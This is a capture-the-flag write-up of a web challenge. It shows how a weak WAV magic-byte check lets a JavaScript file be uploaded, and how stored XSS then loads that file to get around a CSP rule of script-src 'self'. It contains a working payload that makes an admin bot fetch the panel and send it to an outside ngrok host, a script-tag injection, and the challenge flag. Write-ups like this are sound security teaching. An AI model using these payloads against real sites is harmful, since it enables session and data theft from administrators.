One more login screen for the next challenge:

![image](https://user-images.githubusercontent.com/80063008/227709302-e2c0023c-fb15-466e-936e-4dccb557ccc1.png)

At first I analyzed the `spybug-agent.go` file which was provided initially. The full source code was provided later. From the agent code I could figure out some endpoints and some functionality.

![image](https://user-images.githubusercontent.com/80063008/227709560-d1e89851-c4f5-4121-868f-745b3d9ee05b.png)

For example, we have a `/agents/register` endpoint. This gives us two UUIDs. An identifier and a token.

![image](https://user-images.githubusercontent.com/80063008/227709545-db9b2da0-8d21-48b7-b9f7-7ac1cf6b7e9e.png)

On the `/agents/check/<identifier>/<token>` endpoint we can check the agent we just registered but we get nothing more than an OK.

![image](https://user-images.githubusercontent.com/80063008/227709622-5d527a9e-6103-46c3-b3e5-6f43ea1372b8.png)

We also have a POST request to `/agents/details/<identifier>/<token>` which takes some user input. We can send a "hostname", "platform", "arch".

![image](https://user-images.githubusercontent.com/80063008/227709678-6edeb7d1-bc6c-40c3-ba67-9b9037a61008.png)

I built that request in BurpSuite but again, we get nothing more than an OK:

![image](https://user-images.githubusercontent.com/80063008/227709738-14f7f831-58f2-4ef5-8c95-09d3f12423a1.png)

We have another function to an `/agents/upload/<identifier>/<token>` endpoint.

![image](https://user-images.githubusercontent.com/80063008/227709797-cfaab1dd-ccf6-441a-803f-16f30ca4606c.png)

This expects us to send a POST request to upload a wave file within a form-data request with the filename being "recording"

![image](https://user-images.githubusercontent.com/80063008/227709827-6835c5fb-27b7-46bd-bc18-49da270f0bc4.png)

I tried to do the multipart/form-data upload but I kept getting a `Bad Request` response. That is until they released the rest of the source code and I noticed this in `control-panel/routes/agents.js`:

![image](https://user-images.githubusercontent.com/80063008/227710300-8d7738e0-8883-471d-a2ae-baf7c5fa3b77.png)

The server expects a specific "audio/wave" mimetype and the ".wav" extension. We also notice another important part in the same file. There's an additional filter to the file upload.

![image](https://user-images.githubusercontent.com/80063008/227710128-a82d1000-9ddf-4f5b-a206-8bb98f503ab7.png)

The server checks the file header to ensure that it is a wave file. Or at least that is the intent. What it actually does is it only checks if the specific hex values are located anywhere in the file. It's not actually checking the file header. This means we can send a request like this and we no longer get a "Bad Request" error message. We actually get an UUID assigned to the file upload:

![image](https://user-images.githubusercontent.com/80063008/227710411-b952e25a-d000-4203-9b40-010114f93ad6.png)

In the `control-panel/utils/adminbot.js` we also notice that there's a bot accessing the admin panel. 

![image](https://user-images.githubusercontent.com/80063008/227710967-3b1b4a2f-aa63-4492-8139-19e7880bc324.png)

It doesn't click on anything though. At this point I wanted to have a look at the admin panel myself. I modified the `build-docker.sh` file to put a password in the ADMIN_SECRET variable:

![image](https://user-images.githubusercontent.com/80063008/227710551-35a4ff30-f2ec-4041-bc50-a8c380578f5c.png)

I logged in and now can see the admin panel with some content that I passed at a certain point. A POST request sending details and an upload:

![image](https://user-images.githubusercontent.com/80063008/227710597-595a083e-5c4a-42d1-9b29-2542621ec693.png)

Inspecting the audio controls, we can also see where it's taking it from:

![image](https://user-images.githubusercontent.com/80063008/227710902-bac8c224-804a-4fc1-96d0-8317f4a9d8be.png)

Now that I can see what the bot would see. I tried a simple XSS payload in the hostname field but I got blocked by the CSP:

![image](https://user-images.githubusercontent.com/80063008/227710622-7992f5a2-0f50-4bb8-83f1-b379a6989f54.png)

Let's take a closer look at that CSP. 

![image](https://user-images.githubusercontent.com/80063008/227710634-fe67ad11-a1fa-4001-8a8b-a567b48de469.png)

We have `script-src 'self'` but there's also `object-src 'none'`. After doing some research on various CSP bypasses, I found this very helpful blog: https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d

This blog presents various scenarios, including Scenario 5 which seems very applicable to us:

![image](https://user-images.githubusercontent.com/80063008/227710708-757af160-020c-47ee-bd9d-15092f87e37e.png)

Now it all makes sense. We have unsanitized input in the /agents/details endpoint and file upload which can be bypassed in /agents/upload. We should have what we need. 

**Step 1**: Register a new agent to get identifier and token:
![image](https://user-images.githubusercontent.com/80063008/227710772-66c30cc6-9462-4a36-b512-1abcca1679a7.png)

**Step 2**: Upload file with recording name in the form-data, .wav extension, audio/wave mimetype and the wav magic header anywhere in the file (it doesn't check for the magic bytes to be the first ones). I used // to comment it out in the javascript code so that javascript parsing won't error out. The javascript below is simply accessing the admin panel grabbing the response and sending it to our webhook.

```javascript
var target = 'http://localhost:1337/panel';
var req1 = new XMLHttpRequest();
req1.open('GET', target, false);
req1.send();
var response = req1.responseText;
var attack = 'https://5816-188-24-131-248.eu.ngrok.io';
var req2 = new XMLHttpRequest();
req2.open('POST', attack, false);
req2.send(response);
```
![image](https://user-images.githubusercontent.com/80063008/227710815-e6915a95-2557-4dab-a0a1-6a63d90ca7ae.png)

**Step 3**: Post details with the UUID filename within the XSS payload to load the javascript from the local source thus fulfilling the script-src "self" object-src 'none' CSP.

```
<script src=\"/uploads/076095a0-7b50-4dac-b6eb-9900062c5c68\"></script>
```
![image](https://user-images.githubusercontent.com/80063008/227714999-4e397b9f-cd17-4529-a17c-398886a98be8.png)

After a short while, waiting for the bot eagerly, we get the flag:

![image](https://user-images.githubusercontent.com/80063008/227710858-fda45a4f-9f88-42e6-849c-149e25fc1eb5.png)

All in all, this one was my favourite challenge as it presented multiple hurdles and steps where we really needed to think outside the box. Attention to detail every step of the way was important and I enjoyed that.

HTB{p01yg10t5_4nd_35p10n4g3}
